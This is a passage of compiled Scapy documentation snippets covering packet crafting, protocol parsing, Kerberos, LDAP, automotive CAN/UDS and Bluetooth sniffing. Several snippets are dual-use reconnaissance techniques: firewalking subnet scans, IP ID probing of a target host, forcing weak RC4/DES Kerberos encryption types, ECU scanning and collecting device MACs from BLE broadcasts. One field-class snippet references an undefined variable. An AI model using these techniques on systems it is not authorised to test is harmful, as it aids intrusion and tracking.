Python\nCODE:\n```\n>>> a, b = sr(IP(dst=\"www.target.com\")/TCP(sport=[RandShort()]*1000))\n>>> a.plot(lambda x:x[1].id)\n```\n\n----------------------------------------\n\nTITLE: Reading and Parsing Server TLS Record\nDESCRIPTION: Reads TLS server record and processes it with mirrored session context\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook3_tls_compromised.ipynb#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nrecord2_str = open('raw_data/tls_session_compromised/02_srv.raw', 'rb').read()\nrecord2 = TLS(record2_str, tls_session=record1.tls_session.mirror())\nrecord2.msg[0].show()\n```\n\n----------------------------------------\n\nTITLE: Using StreamSocket for DNS Query in Python\nDESCRIPTION: Demonstrates how to use Scapy's StreamSocket with a standard Python socket to send a DNS query and receive the response.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_13\n\nLANGUAGE: python\nCODE:\n```\nimport socket\n\nsck = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # create an UDP socket\nsck.connect((\"8.8.8.8\", 53))  # connect to 8.8.8.8 on 53/UDP\n\n# Create the StreamSocket and gives the class used to decode the answer\nssck = StreamSocket(sck)\nssck.basecls = DNS\n\n# Send the DNS query\nssck.sr1(DNS(rd=1, qd=DNSQR(qname=\"www.example.com\")))\n```\n\n----------------------------------------\n\nTITLE: Creating XCP CTO Messages in Python\nDESCRIPTION: Demonstrates how to create Command Transfer Object (CTO) messages for the XCP protocol, including Connect and GetDaqResolutionInfo commands.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_14\n\nLANGUAGE: Python\nCODE:\n```\nCTORequest() / Connect()\nCTORequest() / GetDaqResolutionInfo()\nCTORequest() / GetSeed(mode=0x01, resource=0x00)\n```\n\n----------------------------------------\n\nTITLE: Sending HTTP/2 Settings and Handling Server Responses in Python\nDESCRIPTION: Sends HTTP/2 settings frames to the server and processes incoming frames like PING, WINDOW_UPDATE, and SETTINGS acknowledgments. Manages the connection flow control window.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\nh2seq = h2.H2Seq()\nh2seq.frames = [\n    set_ack,\n    own_set\n]\n# We verify that the server window is large enough for us to send our frames.\nsrv_global_window -= len(str(h2seq))\nassert(srv_global_window >= 0)\nss.send(h2seq)\n\n# Loop until an acknowledgement for our settings is received\nnew_frame = None\nwhile isinstance(new_frame, type(None)) or not (\n        new_frame.type == h2.H2SettingsFrame.type_id \n        and 'A' in new_frame.flags\n    ):\n    if not isinstance(new_frame, type(None)):\n        # If we received a frame about window management \n        if new_frame.type == h2.H2WindowUpdateFrame.type_id:\n            # For this tutorial, we don't care about stream-specific windows, but we should :)\n            if new_frame.stream_id == 0:\n                srv_global_window += new_frame.payload.win_size_incr\n        # If we received a Ping frame, we acknowledge the ping, \n        # just by setting the ACK flag (A), and sending back the query\n        elif new_frame.type == h2.H2PingFrame.type_id:\n            new_flags = new_frame.getfieldval('flags')\n            new_flags.add('A')\n            new_frame.flags = new_flags\n            srv_global_window -= len(str(new_frame))\n            assert(srv_global_window >= 0)\n            ss.send(new_frame)\n        else:\n            assert new_frame.type != h2.H2ResetFrame.type_id \\\n                and new_frame.type != h2.H2GoAwayFrame.type_id, \\\n                \"Error received; something is not right!\"\n    try:\n        new_frame = ss.recv()\n        new_frame.show()\n    except:\n        import time\n        time.sleep(1)\n        new_frame = None\n```\n\n----------------------------------------\n\nTITLE: Encoding and Decoding ASN.1 Objects with BER in Python\nDESCRIPTION: Shows how to use BER encoding and decoding methods provided by Scapy for various ASN.1 objects.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/advanced_usage.rst#2025-04-23_snippet_3\n\nLANGUAGE: Python\nCODE:\n```\n>>> BERcodec_INTEGER.enc(7)\n'\\x02\\x01\\x07'\n>>> BERcodec_BIT_STRING.enc(\"egg\")\n'\\x03\\x03egg'\n>>> BERcodec_STRING.enc(\"egg\")\n'\\x04\\x03egg'\n>>> BERcodec_STRING.dec('\\x04\\x03egg')\n(<ASN1_STRING['egg']>, '')\n>>> BERcodec_Object.dec('\\x03\\x03egg')\n(<ASN1_BIT_STRING['egg']>, '')\n```\n\n----------------------------------------\n\nTITLE: Defining a Custom Field Type for Variable Length Quantities in Python\nDESCRIPTION: This snippet shows how to create a custom field type in Scapy to handle variable length quantities, including methods for conversion and packet manipulation.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nclass VarLenQField(Field):\n    \"\"\" variable length quantities \"\"\"\n    __slots__ = [\"fld\"]\n\n    def __init__(self, name, default, fld):\n        Field.__init__(self, name, default)\n        self.fld = fld\n        \n    def i2m(self, pkt, x):\n        if x is None:\n            f = pkt.get_field(self.fld)\n            x = f.i2len(pkt, pkt.getfieldval(self.fld))\n            x = vlenq2str(x)\n        return raw(x)\n\n    def m2i(self, pkt, x):\n        if s is None:\n            return None, 0\n        return str2vlenq(x)[1]\n\n    def addfield(self, pkt, s, val):\n        return s+self.i2m(pkt, val)\n\n    def getfield(self, pkt, s):\n        return str2vlenq(s)\n```\n\n----------------------------------------\n\nTITLE: Dissecting DCE/RPC Packets in Python using Scapy\nDESCRIPTION: This snippet demonstrates how to dissect a DCE/RPC packet from a pcap file using Scapy. It shows loading the msrpce layer, binding DCE/RPC to TCP ports, and using a DceRpcSession to properly dissect the stateful protocol.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/dcerpc.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\n>>> load_layer(\"msrpce\")\n>>> bind_layers(TCP, DceRpc, sport=40564)  # the DCE/RPC port\n>>> bind_layers(TCP, DceRpc, dport=40564)\n>>> pkts = sniff(offline='dcerpc_msnrpc.pcapng.gz', session=DceRpcSession)\n>>> pkts[6][DceRpc5].show()\n```\n\n----------------------------------------\n\nTITLE: Sending TCP Segment with MSS Option in Python\nDESCRIPTION: Demonstrates how to send a TCP segment with the maximum segment size (MSS) option set to 0 to a specific IP address and port using Scapy.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nsend(IP(dst=\"1.2.3.4\")/TCP(dport=502, options=[(\"MSS\", 0)]))\n```\n\n----------------------------------------\n\nTITLE: Exploring HTTP Layer Contents in Scapy\nDESCRIPTION: Shows how to explore the available HTTP modules in Scapy's layers using the explore() function. This displays the packet classes available for HTTP communication.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/http.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\n>>> explore(scapy.layers.http)\nPackets contained in scapy.layers.http:\nClass       |Name\n------------|-------------\nHTTP        |HTTP 1\nHTTPRequest |HTTP Request\nHTTPResponse|HTTP Response\n```\n\n----------------------------------------\n\nTITLE: Creating Native CANSockets with Filters in Python\nDESCRIPTION: These examples demonstrate various ways to create native CANSockets in Scapy, including applying different types of filters to control which messages are received.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\nconf.contribs['CANSocket'] = {'use-python-can': False} #(default)\nload_contrib('cansocket')\n\n# Simple Socket\nsocket = CANSocket(channel=\"vcan0\")\n\n# With specific ID filter\nsocket = CANSocket(channel=\"vcan0\", can_filters=[{'can_id': 0x200, 'can_mask': 0x7FF}])\n\n# With ID range filter\nsocket = CANSocket(channel=\"vcan0\", can_filters=[{'can_id': 0x200, 'can_mask': 0x700}])\n\n# With inverted filter\nsocket = CANSocket(channel=\"vcan0\", can_filters=[{'can_id': 0x200 | CAN_INV_FILTER, 'can_mask': 0x7FF}])\n\n# With multiple filters\nsocket = CANSocket(channel='vcan0', can_filters=[{'can_id': 0x200, 'can_mask': 0x7ff},\n                                                {'can_id': 0x400, 'can_mask': 0x7ff},\n                                                {'can_id': 0x600, 'can_mask': 0x7ff},\n                                                {'can_id': 0x7ff, 'can_mask': 0x7ff}])\n\n# Receiving own messages\nsocket = CANSocket(channel=\"vcan0\", receive_own_messages=True)\n```\n\n----------------------------------------\n\nTITLE: Creating a NetlogonClient in Python with Scapy\nDESCRIPTION: This code snippet shows how to create a NetlogonClient, which is an extension of the DCERPC_Client class. It demonstrates connecting, binding, and negotiating a session key.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/dcerpc.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.layers.msrpce.msnrpc import *\nfrom scapy.layers.msrpce.raw.ms_nrpc import *\n\nclient = NetlogonClient(\n    auth_level=DCE_C_AUTHN_LEVEL.PKT_PRIVACY,\n    computername=\"SERVER\",\n    domainname=\"DOMAIN\",\n)\nclient.connect_and_bind(\"192.168.0.100\")\nclient.negotiate_sessionkey(bytes.fromhex(\"77777777777777777777777777777777\"))\nclient.close()\n```\n\n----------------------------------------\n\nTITLE: Sending ICMP Echo Request with Scapy in Python\nDESCRIPTION: This script sends an ICMP echo request to a specified IP address or hostname and displays the dissected return packet. It demonstrates basic usage of Scapy for network probing.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/extending.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\n#! /usr/bin/env python\n\nimport sys\nfrom scapy.all import sr1,IP,ICMP\n\np=sr1(IP(dst=sys.argv[1])/ICMP())\nif p:\n    p.show()\n```\n\n----------------------------------------\n\nTITLE: Implementing UDS Response Handler in Python\nDESCRIPTION: Class implementation for handling UDS responses in ECU automation. Uses Python's match-case operator to process different UDS services and generate appropriate responses.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_44\n\nLANGUAGE: python\nCODE:\n```\nclass EcuAutomaton(Automaton):\n\n    # Existing states and transitions\n\n    @ATMT.receive_condition(ECU_ON)  # type: ignore\n    def on_pkt_on_received_ON(self, pkt: Packet) -> None:\n        response = None\n        if pkt:\n            if response := self.get_default_uds_response(pkt):\n                self.my_send(response)\n\n    def get_default_uds_response(self, pkt: Packet) -> Optional[Packet]:\n        service = bytes(pkt)[0]\n        length = len(pkt)\n        sub_function = bytes(pkt)[1] if length > 1 else None\n        match service, length, sub_function:\n            case 0x10, 2, 1:\n                return UDS() / UDS_DSCPR(b\"\\x01\")\n            case 0x3E, 2, 0:\n                return UDS() / UDS_TPPR()\n            case 0x3E, 2, 0x80:\n                return None\n            case 0x3E, 2, _:\n                return UDS() / UDS_NR(requestServiceId=service,\n                                      negativeResponseCode=\"subFunctionNotSupported\")\n            case 0x3E, _, _:\n                return UDS() / UDS_NR(requestServiceId=service,\n                                      negativeResponseCode=\"incorrectMessageLengthOrInvalidFormat\")\n            case 0x27, _, _:\n                return UDS() / UDS_NR(requestServiceId=service,\n                                      negativeResponseCode=\"incorrectMessageLengthOrInvalidFormat\")\n            case _:\n                return UDS() / UDS_NR(requestServiceId=service, negativeResponseCode=\"serviceNotSupported\")\n```\n\n----------------------------------------\n\nTITLE: Setting up ICMP Echo Answering Machine in Scapy\nDESCRIPTION: Python code to create and start an ICMP Echo answering machine using the TUN interface in Scapy.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/tuntap.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\n>>> am = t.am(ICMPEcho_am)\n>>> am()\n```\n\n----------------------------------------\n\nTITLE: Using XCPScanner in Interactive Shell in Python\nDESCRIPTION: Demonstrates how to use the XCPScanner in an interactive Python shell to scan for XCP-supporting ECUs on a CAN bus.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_19\n\nLANGUAGE: Python\nCODE:\n```\nconf.contribs['CANSocket'] = {'use-python-can': False}\nload_layer(\"can\")\nload_contrib(\"automotive.xcp.xcp\")\nsock = CANSocket(\"vcan0\")\nsock.basecls = XCPOnCAN\nscanner = XCPOnCANScanner(sock)\nresult = scanner.start_scan()\n```\n\n----------------------------------------\n\nTITLE: Performing AS-REQ and TGS-REQ Operations in Python\nDESCRIPTION: This snippet demonstrates how to perform AS-REQ and TGS-REQ operations using Scapy's Kerberos functions. It includes examples of enforcing specific encryption types and requesting service tickets.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_14\n\nLANGUAGE: python\nCODE:\n```\n>>> res = krb_as_req(\"user1@DOMAIN.LOCAL\", password=\"Password1\")\n>>> res.asrep.show()\n>>> res.sessionkey.toKey()\n\n>>> from scapy.libs.rfc3961 import EncryptionType\n>>> res = krb_as_req(\"user1@DOMAIN.LOCAL\", etypes=[EncryptionType.RC4_HMAC])\n\n>>> res = krb_as_req(\"user1@DOMAIN.LOCAL\", etypes=[EncryptionType.DES_CBC_MD5, EncryptionType.RC4_HMAC])\n\n>>> krb_tgs_req(\"user1@DOMAIN.LOCAL\", \"host/DC1\", sessionkey=res.sessionkey, ticket=res.asrep.ticket)\n\n>>> krb_as_and_tgs(\"user1@DOMAIN.LOCAL\", \"host/DC1\", password=\"Password1\")\n\n>>> krb_tgs_req(\"user1@DOMAIN.LOCAL\", \"krbtgt/DOMAIN.LOCAL\", sessionkey=res.sessionkey, ticket=res.asrep.ticket, renew=True)\n\n>>> res2 = krb_tgs_req(\"user1@DOMAIN.LOCAL\", \"host/DC1\", sessionkey=res.sessionkey, ticket=res.asrep.ticket)\n>>> krb_tgs_req(\"user1@DOMAIN.LOCAL\", \"host/DC1\", sessionkey=res2.sessionkey, ticket=res2.tgsrep.ticket, renew=True)\n```\n\n----------------------------------------\n\nTITLE: Installing Latest Scapy Release via pip\nDESCRIPTION: Simple pip command to install the latest stable release of Scapy.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/installation.rst#2025-04-23_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ pip install scapy\n```\n\n----------------------------------------\n\nTITLE: Customizing Packet Output with Scapy's sprintf() Function\nDESCRIPTION: Shows how to use Scapy's sprintf() function to format the output of captured packets. This example prints the source and destination IP addresses, along with the raw payload of each packet.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_21\n\nLANGUAGE: python\nCODE:\n```\npkts = sniff(prn=lambda x:x.sprintf(\"{IP:%IP.src% -> %IP.dst%\\n}{Raw:%Raw.load%\\n}\"))\n```\n\n----------------------------------------\n\nTITLE: Retrieving Interface Names in Scapy\nDESCRIPTION: Shows how to use the get_if_list() function to retrieve a list of interface names in Scapy.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/routing.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n>>> get_if_list()\n['lo', 'eth0']\n```\n\n----------------------------------------\n\nTITLE: Creating Python-can CANSockets in Python\nDESCRIPTION: This snippet shows how to create CANSockets using the python-can library, which provides support for various CAN interfaces across different operating systems.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\nconf.contribs['CANSocket'] = {'use-python-can': True}\nload_contrib('cansocket')\n\n# Simple python-can CANSocket\nsocket = CANSocket(bustype='socketcan', channel='vcan0', bitrate=250000)\n\n# Python-can CANSocket with multiple filters\nsocket = CANSocket(bustype='socketcan', channel='vcan0', bitrate=250000,\n                can_filters=[{'can_id': 0x200, 'can_mask': 0x7ff},\n                            {'can_id': 0x400, 'can_mask': 0x7ff},\n                            {'can_id': 0x600, 'can_mask': 0x7ff},\n                            {'can_id': 0x7ff, 'can_mask': 0x7ff}])\n```\n\n----------------------------------------\n\nTITLE: Using DNSTCP for DNS Message over TCP in Scapy\nDESCRIPTION: This snippet demonstrates how to build and decode a DNS message over TCP using the newly defined DNSTCP class.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_19\n\nLANGUAGE: python\nCODE:\n```\n# Build then decode a DNS message over TCP\nDNSTCP(raw(DNSTCP(dns=DNS())))\n```\n\n----------------------------------------\n\nTITLE: Initializing TCP Socket for HTTP/2 Connection in Python\nDESCRIPTION: Creates a TCP socket and resolves the IP address for www.google.fr. Sets socket options for address and port reuse.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nimport socket\ndn = 'www.google.fr'\n\n# Get the IP address of a Google HTTP endpoint\nl = socket.getaddrinfo(dn, 443, socket.INADDR_ANY, socket.SOCK_STREAM, socket.IPPROTO_TCP)\nassert len(l) > 0, 'No address found :('\n\ns = socket.socket(l[0][0], l[0][1], l[0][2])\ns.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\nif hasattr(socket, 'SO_REUSEPORT'):\n    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)\nip_and_port = l[0][4]\n```\n\n----------------------------------------\n\nTITLE: Firewalking with Scapy in Python\nDESCRIPTION: These snippets demonstrate firewalking techniques using Scapy. The first example sends TCP packets with increasing TTL to detect filtering operations. The second example finds subnets on a multi-NIC firewall by sending packets with a specific TTL.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_51\n\nLANGUAGE: python\nCODE:\n```\nans, unans = sr(IP(dst=\"172.16.4.27\", ttl=16)/TCP(dport=(1,1024))) \nfor s,r in ans: \n    if r.haslayer(ICMP) and r.payload.type == 11: \n        print s.dport\n```\n\nLANGUAGE: python\nCODE:\n```\nans, unans = sr(IP(dst=\"172.16.5/24\", ttl=15)/TCP()) \nfor i in unans: print i.dst\n```\n\n----------------------------------------\n\nTITLE: Starting an Endpoint Mapper for DCERPC in Python with Scapy\nDESCRIPTION: This code snippet shows how to start an endpoint mapper for DCERPC, which should be a separate process from the RPC server.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/dcerpc.rst#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.layers.dcerpc import *\nfrom scapy.layers.msrpce.all import *\n\nDCERPC_Server.spawn(\n    DCERPC_Transport.NCACN_IP_TCP,\n    iface=\"eth0\",\n    port=135,\n    portmap={\n        find_dcerpc_interface(\"wkssvc\"): 12345,\n    },\n    ndr64=True,\n)\n```\n\n----------------------------------------\n\nTITLE: Basic Packet Dissection Method in Python\nDESCRIPTION: This snippet shows the core dissection method used in Scapy's Packet class, which is the foundation for parsing incoming packets.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\ndef dissect(self, s):\n    s = self.pre_dissect(s)\n    s = self.do_dissect(s)\n```\n\n----------------------------------------\n\nTITLE: Querying LDAP Data in Python with Scapy\nDESCRIPTION: Shows how to perform LDAP queries using the search method, including specifying base DN, filter, and attributes.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/ldap.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nclient.sr1(LDAP_SearchRequest()).show()\n```\n\nLANGUAGE: python\nCODE:\n```\nresp = client.search(\n    \"CN=Users,DC=domain,DC=local\",\n    \"(objectCategory=person)\",\n    [\"objectClass\", \"name\", \"description\", \"canonicalName\"],\n    scope=1,  # children\n)\nresp.show()\n```\n\nLANGUAGE: python\nCODE:\n```\nresp = client.sr1(\n    LDAP_SearchRequest(\n        filter=LDAP_Filter(\n            filter=LDAP_FilterEqual(\n                attributeType=ASN1_STRING(b'objectCategory'),\n                attributeValue=ASN1_STRING(b'person')\n            )\n        ),\n        attributes=[\n            LDAP_SearchRequestAttribute(type=ASN1_STRING(b'objectClass')),\n            LDAP_SearchRequestAttribute(type=ASN1_STRING(b'name')),\n            LDAP_SearchRequestAttribute(type=ASN1_STRING(b'description')),\n            LDAP_SearchRequestAttribute(type=ASN1_STRING(b'canonicalName'))\n        ],\n        baseObject=ASN1_STRING(b'CN=Users,DC=domain,DC=local'),\n        scope=ASN1_ENUMERATED(1),\n        derefAliases=ASN1_ENUMERATED(0),\n        sizeLimit=ASN1_INTEGER(1000),\n        timeLimit=ASN1_INTEGER(60),\n        attrsOnly=ASN1_BOOLEAN(0)\n    )\n)\n```\n\n----------------------------------------\n\nTITLE: Building Complete RTC Packet in Python using Scapy\nDESCRIPTION: This example shows how to construct a complete RTC packet using PNIORealTimeCyclicPDU. It includes multiple data packets in the 'data' field of the RTC packet.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/pnio.rst#2025-04-23_snippet_1\n\nLANGUAGE: Python\nCODE:\n```\n>>> load_contrib('pnio')\n>>> p=PNIORealTimeCyclicPDU(cycleCounter=1024, data=[\n... PNIORealTime_IOxS(),\n... PNIORealTimeCyclicPDU.build_fixed_len_raw_type(4)(data = b'AAA') / PNIORealTime_IOxS(),\n... PROFIsafe.build_PROFIsafe_class(PROFIsafeControl, 4)(data = b'AAA', control=0x20, crc=0x424242)/PNIORealTime_IOxS(),\n... ])\n>>> p.show()\n```\n\n----------------------------------------\n\nTITLE: Managing Scapy Sessions\nDESCRIPTION: Demonstrates saving and loading Scapy sessions using save_session() and load_session() functions. This allows preserving variables and packet data between different Scapy sessions.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_30\n\nLANGUAGE: Python\nCODE:\n```\n>>> save_session(\"session.scapy\")\n>>> load_session(\"session.scapy\")\n```\n\n----------------------------------------\n\nTITLE: Inspecting Apple BLE Advertisement Frame with Scapy\nDESCRIPTION: This example demonstrates how to parse and inspect a raw BTLE advertisement frame from an Apple device using Scapy. It shows the layered structure of Apple's BLE frames, including submessages for different services.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/bluetooth.rst#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\np = BTLE(hex_bytes('d6be898e4024320cfb574d5a02011a1aff4c000c0e009c6b8f40440f1583ec895148b410050318c0b525b8f7d4'))\np.show()\n```\n\n----------------------------------------\n\nTITLE: Implementing DNS over TCP Protocol in Scapy\nDESCRIPTION: This snippet defines a new DNSTCP class that inherits from Packet to implement DNS over TCP. It specifies fields for length and DNS message, with automatic length computation.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_18\n\nLANGUAGE: python\nCODE:\n```\nclass DNSTCP(Packet):\n    name = \"DNS over TCP\"\n    \n    fields_desc = [ FieldLenField(\"len\", None, fmt=\"!H\", length_of=\"dns\"),\n                    PacketLenField(\"dns\", 0, DNS, length_from=lambda p: p.len)]\n    \n    # This method tells Scapy that the next packet must be decoded with DNSTCP\n    def guess_payload_class(self, payload):\n        return DNSTCP\n```\n\n----------------------------------------\n\nTITLE: Creating a Path Header with No Indexing for HTTP/2\nDESCRIPTION: Builds a path header for sensitive data without indexing. Uses the static header table to find the index for ':path', then creates a HPackLitHdrFldWithoutIndexing object with the never_index bit set to prevent compression of sensitive values.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_34\n\nLANGUAGE: python\nCODE:\n```\npath_hdr_idx = tblhdr.get_idx_by_name(':path')\npath_str = h2.HPackHdrString(data = z_str)\npath_hdr = h2.HPackLitHdrFldWithoutIndexing(\n    never_index=1, \n    index=path_hdr_idx,\n    hdr_value=path_str\n)\npath_hdr.show()\nhdrs_frm.payload.hdrs.append(path_hdr)\n```\n\n----------------------------------------\n\nTITLE: Capturing Bluetooth Advertisement Packets\nDESCRIPTION: Sniffs and filters Bluetooth LE advertising reports from the HCI interface. Uses lfilter to capture only advertising report packets.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/bluetooth.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\n>>> # The lfilter will drop anything that's not an advertising report.\n>>> adverts = bt.sniff(lfilter=lambda p: HCI_LE_Meta_Advertising_Reports in p)\n```\n\n----------------------------------------\n\nTITLE: Creating Netflow V5 Packet in Python with Scapy\nDESCRIPTION: This code snippet shows how to generate a Netflow V5 packet using Scapy. It creates a Netflow header, a Netflow V5 header with a single record count, and a Netflow V5 record with a specified destination IP. The packet is then wrapped in Ethernet, IP, and UDP layers.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/netflow.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nnetflow = NetflowHeader()/NetflowHeaderV5(count=1)/NetflowRecordV5(dst=\"192.168.0.1\")\npkt = Ether()/IP()/UDP()/netflow\n```\n\n----------------------------------------\n\nTITLE: Importing Kerberos Tickets from ccache File in Scapy\nDESCRIPTION: This snippet demonstrates how to import Kerberos tickets from a ccache file into Scapy's Ticketer module. It requires a properly configured /etc/krb5.conf file with the relevant realm settings.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\n$ kinit Administrator@DOMAIN.LOCAL\nPassword for Administrator@DOMAIN.LOCAL:\n$ scapy\n>>> load_module(\"ticketer\")\n>>> t = Ticketer()\n>>> t.open_file(\"/tmp/krb5cc_1000\")\n>>> t.show()\nTickets:\n1. Administrator@DOMAIN.LOCAL -> krbtgt/DOMAIN.LOCAL@DOMAIN.LOCAL\nStart time         End time           Renew until        Auth time\n31/08/23 12:08:15  31/08/23 22:08:15  01/09/23 12:08:12  31/08/23 12:08:15\n```\n\n----------------------------------------\n\nTITLE: Implementing DBC File Format for CAN Signal Handling in Scapy\nDESCRIPTION: Shows how to implement the DBC file format in Scapy using SignalPacket and SignalFields classes. The example demonstrates implementation of multiplexed signals using ConditionalFields based on a DBC specification.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\nclass muxTestFrame(SignalPacket):\n    fields_desc = [\n        LEUnsignedSignalField(\"myMuxer\", default=0, start=53, size=3),\n        ConditionalField(LESignedSignalField(\"muxSig4\", default=0, start=25, size=7), lambda p: p.myMuxer == 0),\n        ConditionalField(LEUnsignedSignalField(\"muxSig3\", default=0, start=16, size=9), lambda p: p.myMuxer == 0),\n        ConditionalField(BESignedSignalField(\"muxSig2\", default=0, start=15, size=8), lambda p: p.myMuxer == 0),\n        ConditionalField(LESignedSignalField(\"muxSig1\", default=0, start=0, size=8), lambda p: p.myMuxer == 0),\n```\n\n----------------------------------------\n\nTITLE: Real-time ARP Monitor with Scapy in Python\nDESCRIPTION: This script continuously monitors all interfaces for ARP requests and prints them. It demonstrates Scapy's packet sniffing capabilities and how to handle Wi-Fi cards in monitor mode.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/extending.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\n#! /usr/bin/env python\nfrom scapy.all import *\n\ndef arp_monitor_callback(pkt):\n    if ARP in pkt and pkt[ARP].op in (1,2): #who-has or is-at\n        return pkt.sprintf(\"%ARP.hwsrc% %ARP.psrc%\")\n\nsniff(prn=arp_monitor_callback, filter=\"arp\", store=0)\n```\n\n----------------------------------------\n\nTITLE: Displaying Default HTTP Response Structure in Scapy\nDESCRIPTION: Shows the default structure of an HTTPResponse object in Scapy, displaying the default status code and available header fields for HTTP responses.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/http.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n>>> HTTPResponse().show()\n###[ HTTP Response ]###\n  Http_Version= 'HTTP/1.1'\n  Status_Code= '200'\n  Reason_Phrase= 'OK'\n  Accept_Patch43= None\n  Accept_Ranges= None\n  [...]\n```\n\n----------------------------------------\n\nTITLE: Using ISOTP with Python-CAN CANSockets\nDESCRIPTION: This example shows how to configure ISOTP to use python-can and create an ISOTP socket with a CANSocket for communication.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_25\n\nLANGUAGE: python\nCODE:\n```\nconf.contribs['ISOTP'] = {'use-can-isotp-kernel-module': False}\nconf.contribs['CANSocket'] = {'use-python-can': True}\nload_contrib('isotp')\nwith ISOTPSocket(CANSocket(bustype='socketcan', channel=\"can0\"), tx_id=0x641, rx_id=0x241) as sock:\n    sock.send(...)\n```\n\n----------------------------------------\n\nTITLE: Filtering BLE Advertising Reports for Google Devices\nDESCRIPTION: This code filters BLE advertising reports to find devices broadcasting the Google-specific UUID 0xfe50, commonly used by Android devices. It demonstrates how to inspect and filter BLE reports based on specific criteria.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/bluetooth.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\n# Get one packet for each device that broadcasted short UUID 0xfe50 (Google).\n# Android devices broadcast this pretty much constantly.\ngoogle = {}\nfor mac, reports in devices.items():\n  for report in reports:\n    if (EIR_CompleteList16BitServiceUUIDs in report and\n        0xfe50 in report[EIR_CompleteList16BitServiceUUIDs].svc_uuids):\n      google[mac] = report\n      break\n\n# List MAC addresses that sent such a broadcast\nprint(google.keys())\n# dict_keys(['xx:xx:xx:xx:xx:xx', 'xx:xx:xx:xx:xx:xx'])\n```\n\n----------------------------------------\n\nTITLE: Sending XCP Message over CAN in 